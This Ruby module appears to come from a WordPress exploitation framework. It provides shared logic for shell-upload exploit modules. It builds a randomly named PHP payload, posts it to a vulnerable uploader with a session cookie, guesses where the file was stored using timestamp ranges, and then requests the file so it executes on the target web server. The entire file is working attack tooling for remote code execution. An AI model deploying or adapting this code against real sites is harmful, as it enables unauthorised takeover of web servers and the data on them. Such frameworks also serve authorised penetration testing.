# frozen_string_literal: true

# Provides reusable functionality for shell upload modules.
module Wpxf::WordPress::ShellUpload
  include Wpxf

  # Initialize a new instance of {ShellUpload}
  def initialize
    super
    @session_cookie = nil
    @upload_result = nil
    @payload_name = nil
    @info[:desc] = %(
      This module exploits a file upload vulnerability
      which allows users to upload and execute PHP
      scripts in the context of the web server.
    )

    register_advanced_options([
      IntegerOption.new(
        name: 'payload_name_length',
        desc: 'The number of characters to use when generating the payload name',
        required: true,
        default: rand(5..10),
        min: 1,
        max: 256
      )
    ])
  end

  # @return [HttpResponse, nil] the {Wpxf::Net::HttpResponse} of the upload operation.
  def upload_result
    @upload_result
  end

  # @return [String] the file name of the payload, including the file extension.
  def payload_name
    @payload_name
  end

  # @return [String] the URL of the file used to upload the payload.
  def uploader_url
    nil
  end

  # @return [BodyBuilder] the {Wpxf::Utility::BodyBuilder} used to generate the uploader form.
  def payload_body_builder
    nil
  end

  # @return [String] the URL of the payload after it is uploaded to the target.
  def uploaded_payload_location
    nil
  end

  # @return [Array] an array of possible locations that the payload could have been uploaded to.
  def possible_payload_upload_locations
    nil
  end

  # Called prior to preparing and uploading the payload.
  # @return [Boolean] true if no errors occurred.
  def before_upload
    true
  end

  # @return [Integer] the response code to expect from a successful upload operation.
  def expected_upload_response_code
    200
  end

  # @return [Hash] the query string parameters to use when submitting the upload request.
  def upload_request_params
    nil
  end

  # @return [String] the extension type to use when generating the payload name.
  def payload_name_extension
    'php'
  end

  # Run the module.
  # @return [Boolean] true if successful.
  def run
    return false unless super
    return false unless before_upload

    emit_info 'Preparing payload...'
    @payload_name = "#{Utility::Text.rand_alpha(_payload_name_length)}.#{payload_name_extension}"
    builder = payload_body_builder
    return false unless builder

    emit_info 'Uploading payload...'
    return false unless _upload_payload(builder)

    emit_info 'Executing the payload...'
    _validate_and_prepare_upload_locations.each do |payload_url|
      break if execute_payload(payload_url)&.code != 404
    end

    true
  end

  # @return [Boolean] true if the result of the upload operation is valid.
  def validate_upload_result
    true
  end

  # Execute the payload at the specified address.
  # @param payload_url [String] the payload URL to access.
  # @return [HttpResponse] the HTTP response of the request to the payload URL.
  def execute_payload(payload_url)
    res = execute_get_request(url: payload_url, cookie: @session_cookie)
    emit_success "Result: #{res.body}" if res && res.code == 200 && !res.body.strip.empty?
    res
  end

  # @return [Integer] the number of seconds to adjust the upload timestamp range start and end values by.
  def timestamp_range_adjustment_value
    10
  end

  # @return [Array] the range of possible timestamps that could have been used when the payload reached the target.
  def upload_timestamp_range
    (@start_timestamp - timestamp_range_adjustment_value)..(@end_timestamp + timestamp_range_adjustment_value)
  end

  private

  def _validate_and_prepare_upload_locations
    payload_urls = possible_payload_upload_locations
    return payload_urls unless payload_urls.nil?

    payload_url = uploaded_payload_location
    return false unless payload_url

    emit_success "Uploaded the payload to #{payload_url}", true
    [].push(payload_url)
  end

  def _payload_name_length
    normalized_option_value('payload_name_length')
  end

  def _upload_payload(builder)
    @start_timestamp = Time.now.to_i

    builder.create do |body|
      @upload_result = execute_post_request(url: uploader_url, params: upload_request_params, body: body, cookie: @session_cookie)
    end

    @end_timestamp = Time.now.to_i

    if @upload_result.nil? || @upload_result.timed_out?
      emit_error 'No response from the target'
      return false
    end

    if @upload_result.code != expected_upload_response_code
      emit_info "Response code: #{@upload_result.code}", true
      emit_info "Response body: #{@upload_result.body}", true
      emit_error 'Failed to upload payload'
      return false
    end

    validate_upload_result
  end
end
